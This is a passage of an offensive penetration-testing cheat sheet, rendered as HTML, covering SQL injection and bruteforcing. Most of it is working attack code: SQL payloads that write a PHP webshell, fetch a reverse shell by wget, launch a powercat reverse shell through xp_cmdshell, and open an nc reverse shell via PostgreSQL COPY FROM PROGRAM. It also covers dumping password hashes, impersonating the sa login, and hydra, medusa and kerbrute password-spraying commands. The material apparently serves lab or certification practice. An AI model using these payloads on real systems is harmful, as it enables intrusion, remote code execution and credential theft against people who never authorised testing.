</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="k">Select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">database</span><span class="p">.</span><span class="n">usertable</span><span class="w"> </span>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">COLUMN_NAME</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;TABLES&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">TABLE_SCHEMA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;information_schema&#39;</span><span class="p">;</span>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="n">col1</span><span class="p">,</span><span class="s1">&#39;+&#39;</span><span class="p">,</span><span class="n">col2</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span><span class="w"> </span><span class="c1">-- combines multiple rows and columns into single entry</span>
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="c1">-- indirect cmd exec through file upload</span>
</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/tmp/webshell.php&#39;</span><span class="w"> </span><span class="c1">-- error displayed shouldn&#39;t impact the file creation</span>
</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>
</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="mi">9999</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php exec(\&quot;wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\&quot;);?&gt;&#39;</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/test4.php&#39;</span>
</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>
</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>
</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="c1">-- MS SQL</span>
</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span><span class="p">;</span>
</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="n">use</span><span class="w"> </span><span class="k">database</span><span class="p">;</span>
</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">databases</span><span class="p">;</span>
</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="o">&lt;</span><span class="k">database</span><span class="o">&gt;</span><span class="p">.</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">;</span>
</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">database</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">users</span><span class="p">;</span>
</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">tables</span><span class="p">;</span><span class="w"> </span><span class="c1">-- to see all the tables within the specific database</span>
</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">table_catalog</span><span class="p">,</span><span class="w"> </span><span class="k">table_name</span><span class="p">,</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span>
</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sysusers</span><span class="p">;</span>
</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">type_desc</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">all_objects</span><span class="p">;</span>
</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">COLUMN_NAME</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;your_table_name&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">TABLE_SCHEMA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;dbo&#39;</span><span class="p">;</span>
</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">string_agg</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">,</span><span class="s1">&#39;,&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">database</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;users&#39;</span><span class="p">;</span>
</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="n">string_agg</span><span class="p">(</span><span class="k">table_name</span><span class="p">,</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a>
</span><span id="__span-13-31"><a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a><span class="c1">-- To enumerate users</span>
</span><span id="__span-13-32"><a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a><span class="k">select</span><span class="w"> </span><span class="n">sp</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="p">,</span><span class="w"> </span><span class="n">sp</span><span class="p">.</span><span class="n">type_desc</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login_type</span><span class="p">,</span><span class="w"> </span><span class="n">sl</span><span class="p">.</span><span class="n">password_hash</span><span class="p">,</span><span class="w"> </span><span class="n">sp</span><span class="p">.</span><span class="n">create_date</span><span class="p">,</span><span class="w"> </span><span class="n">sp</span><span class="p">.</span><span class="n">modify_date</span><span class="p">,</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">sp</span><span class="p">.</span><span class="n">is_disabled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="s1">&#39;Disabled&#39;</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">&#39;Enabled&#39;</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span><span class="w"> </span><span class="n">sp</span><span class="w"> </span><span class="k">left</span><span class="w"> </span><span class="k">join</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">sql_logins</span><span class="w"> </span><span class="n">sl</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">sp</span><span class="p">.</span><span class="n">principal_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sl</span><span class="p">.</span><span class="n">principal_id</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">sp</span><span class="p">.</span><span class="k">type</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;G&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;R&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">sp</span><span class="p">.</span><span class="n">name</span><span class="p">;</span>
</span><span id="__span-13-33"><a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a>
</span><span id="__span-13-34"><a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a><span class="c1">-- SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.</span>
</span><span id="__span-13-35"><a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a><span class="c1">-- Link : [hacktricks impersonation of the users](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#impersonation-of-other-users)</span>
</span><span id="__span-13-36"><a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a><span class="c1">-- Find users you can impersonate </span>
</span><span id="__span-13-37"><a id="__codelineno-13-37" name="__codelineno-13-37" href="#__codelineno-13-37"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">distinct</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_permissions</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">INNER</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">grantor_principal_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">principal_id</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">permission_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;IMPERSONATE&#39;</span><span class="w"> </span>
</span><span id="__span-13-38"><a id="__codelineno-13-38" name="__codelineno-13-38" href="#__codelineno-13-38"></a><span class="c1">--Check if the user &quot;sa&quot; or any other high privileged user is mentioned # Impersonate sa user </span>
</span><span id="__span-13-39"><a id="__codelineno-13-39" name="__codelineno-13-39" href="#__codelineno-13-39"></a><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="w"> </span>
</span><span id="__span-13-40"><a id="__codelineno-13-40" name="__codelineno-13-40" href="#__codelineno-13-40"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span>
</span><span id="__span-13-41"><a id="__codelineno-13-41" name="__codelineno-13-41" href="#__codelineno-13-41"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span>
</span><span id="__span-13-42"><a id="__codelineno-13-42" name="__codelineno-13-42" href="#__codelineno-13-42"></a>
</span><span id="__span-13-43"><a id="__codelineno-13-43" name="__codelineno-13-43" href="#__codelineno-13-43"></a><span class="c1">-- For enabling xp_cmdshell with having privs</span>
</span><span id="__span-13-44"><a id="__codelineno-13-44" name="__codelineno-13-44" href="#__codelineno-13-44"></a><span class="k">EXECUTE</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-13-45"><a id="__codelineno-13-45" name="__codelineno-13-45" href="#__codelineno-13-45"></a><span class="n">RECONFIGURE</span><span class="p">;</span>
</span><span id="__span-13-46"><a id="__codelineno-13-46" name="__codelineno-13-46" href="#__codelineno-13-46"></a><span class="k">EXECUTE</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-13-47"><a id="__codelineno-13-47" name="__codelineno-13-47" href="#__codelineno-13-47"></a><span class="n">RECONFIGURE</span><span class="p">;</span>
</span><span id="__span-13-48"><a id="__codelineno-13-48" name="__codelineno-13-48" href="#__codelineno-13-48"></a><span class="c1">-- for cmd exec</span>
</span><span id="__span-13-49"><a id="__codelineno-13-49" name="__codelineno-13-49" href="#__codelineno-13-49"></a><span class="k">EXECUTE</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
</span><span id="__span-13-50"><a id="__codelineno-13-50" name="__codelineno-13-50" href="#__codelineno-13-50"></a><span class="c1">-- During sql exploitation combine all of these command in stack SQL query</span>
</span><span id="__span-13-51"><a id="__codelineno-13-51" name="__codelineno-13-51" href="#__codelineno-13-51"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;echo IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.119.3/psh_scripts/powercat.ps1&quot;);powercat -c 192.168.119.3 -p 4444 -e powershell &#39;</span><span class="p">;</span>
</span><span id="__span-13-52"><a id="__codelineno-13-52" name="__codelineno-13-52" href="#__codelineno-13-52"></a>
</span><span id="__span-13-53"><a id="__codelineno-13-53" name="__codelineno-13-53" href="#__codelineno-13-53"></a>
</span><span id="__span-13-54"><a id="__codelineno-13-54" name="__codelineno-13-54" href="#__codelineno-13-54"></a><span class="c1">-- POSTGRESQL</span>
</span><span id="__span-13-55"><a id="__codelineno-13-55" name="__codelineno-13-55" href="#__codelineno-13-55"></a><span class="n">string_agg</span><span class="p">(</span><span class="k">table_name</span><span class="p">,</span><span class="s1">&#39;,&#39;</span><span class="p">)</span><span class="w"> </span><span class="c1">-- group_concat alternative</span>
</span><span id="__span-13-56"><a id="__codelineno-13-56" name="__codelineno-13-56" href="#__codelineno-13-56"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">usename</span><span class="p">,</span><span class="w"> </span><span class="n">passwd</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_shadow</span>
</span><span id="__span-13-57"><a id="__codelineno-13-57" name="__codelineno-13-57" href="#__codelineno-13-57"></a><span class="c1">-- for cmd exec, use ; semicolon to end the previous statement because COPY command runs as a seperate SQL comand in stacked SQL query</span>
</span><span id="__span-13-58"><a id="__codelineno-13-58" name="__codelineno-13-58" href="#__codelineno-13-58"></a><span class="k">COPY</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">&#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</span>
</span><span id="__span-13-59"><a id="__codelineno-13-59" name="__codelineno-13-59" href="#__codelineno-13-59"></a>
</span><span id="__span-13-60"><a id="__codelineno-13-60" name="__codelineno-13-60" href="#__codelineno-13-60"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">shell</span><span class="p">(</span><span class="k">output</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span>
</span><span id="__span-13-61"><a id="__codelineno-13-61" name="__codelineno-13-61" href="#__codelineno-13-61"></a><span class="k">COPY</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f&#39;</span><span class="p">;</span>
</span><span id="__span-13-62"><a id="__codelineno-13-62" name="__codelineno-13-62" href="#__codelineno-13-62"></a>
</span><span id="__span-13-63"><a id="__codelineno-13-63" name="__codelineno-13-63" href="#__codelineno-13-63"></a><span class="n">psql</span><span class="o">&gt;</span><span class="w"> </span><span class="err">\</span><span class="n">l</span><span class="w">  </span><span class="c1">-- to list the database </span>
</span><span id="__span-13-64"><a id="__codelineno-13-64" name="__codelineno-13-64" href="#__codelineno-13-64"></a><span class="n">psql</span><span class="o">&gt;</span><span class="w"> </span><span class="err">\</span><span class="k">c</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="c1">-- to connect to database like &#39;use database&#39; in mariadb/mysql </span>
</span><span id="__span-13-65"><a id="__codelineno-13-65" name="__codelineno-13-65" href="#__codelineno-13-65"></a><span class="n">psql</span><span class="o">&gt;</span><span class="w"> </span><span class="err">\</span><span class="n">dt</span><span class="w">  </span><span class="c1">-- list available tables in the connected dtabase</span>
</span><span id="__span-13-66"><a id="__codelineno-13-66" name="__codelineno-13-66" href="#__codelineno-13-66"></a><span class="n">psql</span><span class="o">&gt;</span><span class="w"> </span><span class="err">\</span><span class="n">dn</span><span class="w">  </span><span class="c1">-- list all schemes of currently connected database</span>
</span><span id="__span-13-67"><a id="__codelineno-13-67" name="__codelineno-13-67" href="#__codelineno-13-67"></a><span class="n">psql</span><span class="o">&gt;</span><span class="w"> </span><span class="err">\</span><span class="o">?</span><span class="w"> </span><span class="c1">--help</span>
</span></code></pre></div>
<h3 id="bruteforcing">🔢Bruteforcing</h3>
<ul>
<li>Go slow to avoid lockouts (respect domain policy)</li>
<li>Spray one password across all usernames</li>
<li>Try <code>username:username</code> as creds</li>
<li>Try  <code>password</code> password</li>
<li>try to use <code>admin:admin</code></li>
<li>Empty Password too</li>
<li>Collect credentials from every place and bruteforce and spray it</li>
<li>Use <code>cewl</code> or similar to generate wordlists from websites</li>
<li>Collect creds from:<ul>
<li>SMB/FTP shares, web apps, exposed files, Git leaks
<div class="language-shell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># In case of unstable network, adjust the the mtu by decreasing till you are good to go</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>sudo<span class="w"> </span>ifconfig<span class="w"> </span>tun0<span class="w"> </span>mtu<span class="w"> </span><span class="m">1250</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>ping<span class="w"> </span>-M<span class="w"> </span><span class="k">do</span><span class="w"> </span>-s<span class="w"> </span><span class="m">1300</span><span class="w"> </span>&lt;vpn-ip&gt;<span class="w">   </span><span class="c1"># -M do = don&#39;t fragment</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="c1"># If it fails, your MTU is too high. Keep lowering the -s size until ping works.</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="c1"># HYDRA</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>hydra<span class="w"> </span>-h<span class="w"> </span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>hydra<span class="w"> </span>http-port-form<span class="w"> </span>-U
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>wordslist.txt<span class="w"> </span><span class="m">192</span>.168.104.52<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^&amp;debug=0:H=Content-Type: application/x-www-form-urlencoded:Failed&quot;</span>
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>hydra<span class="w"> </span>-l<span class="w"> </span>george<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-s<span class="w"> </span><span class="m">2222</span><span class="w"> </span>ssh://192.168.50.201
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>hydra<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>rdp://<span class="nv">$ip</span>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="c1"># Hydra doesn&#39;t support smbv2 or v3 by default</span>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="c1"># -I = ignore restore file </span>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="c1"># -V = verbose</span>
</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="c1"># for base64 encoding </span>
</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="s2">&quot;:username=^USER64^&amp;password=^PASS64^:C=/:F=403&quot;</span>
</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>
</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>
</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="c1"># medusa and ncrack are better alternative to hydra</span>
</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>ls<span class="w"> </span>/usr/lib/x86_64-linux-gnu/medusa/modules/
</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>medusa<span class="w"> </span>-h<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/passwords.txt<span class="w"> </span>-M<span class="w"> </span>smbnt<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span><span class="w"> </span>&gt;<span class="w"> </span>medusa_results.txt
</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>grep<span class="w"> </span><span class="s1">&#39;ACCOUNT_FOUND&#39;</span><span class="w"> </span>medusa_results.txt
</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>
</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>
</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="c1"># rdp can be bruteforce using hydra or through smb bruteforcing using netexec</span>
</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>netexec<span class="w"> </span>smb<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>wordlist.txt<span class="w"> </span>-d<span class="w"> </span>corp.co<span class="w"> </span>--continue-on-success
</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a><span class="c1"># we can also use nxc to check which user is allowed to rdp in which machine using screenshot</span>
</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>netexec<span class="w"> </span>rdp<span class="w"> </span>&lt;ip-range&gt;<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>corp.com<span class="w"> </span>--continue-on-success<span class="w"> </span>--screenshot<span class="w"> </span>--screentime<span class="w"> </span>&lt;time&gt;<span class="w"> </span><span class="c1"># --nla-screenshot</span>
</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>
</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span>-d<span class="w"> </span>corp.com<span class="w"> </span>adusers.txt<span class="w"> </span><span class="s1">&#39;Nexus123!&#39;</span><span class="w"> </span>--dc<span class="w"> </span><span class="m">192</span>.168.237.70
</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>
</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>
</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a><span class="c1"># FFUF</span>
</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>wordslist.txt<span class="w">  </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;username=admin&amp;password=FUZZ&#39;</span><span class="w"> </span>-u<span class="w"> </span>http://192.168.104.52/login.php<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Failed&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span>
</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a>
</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a>
</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a><span class="c1">## GOBUSTER</span>
</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a><span class="c1"># -f to append trailing slash, sometimes /api results in error /api/ reveals data</span>
</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>-r<span class="w"> </span>http://10.10.10.10:8080/<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w">  </span>-x<span class="w"> </span>php,txt,asp,aspx,html,pdf,doc,bak,zip<span class="w"> </span>-p<span class="w"> </span>pattern<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>dir.enum
</span><span id="__span-14-40"><a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a>
</span><span id="__span-14-41"><a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a>zip,tar,tar.gz,txt,php
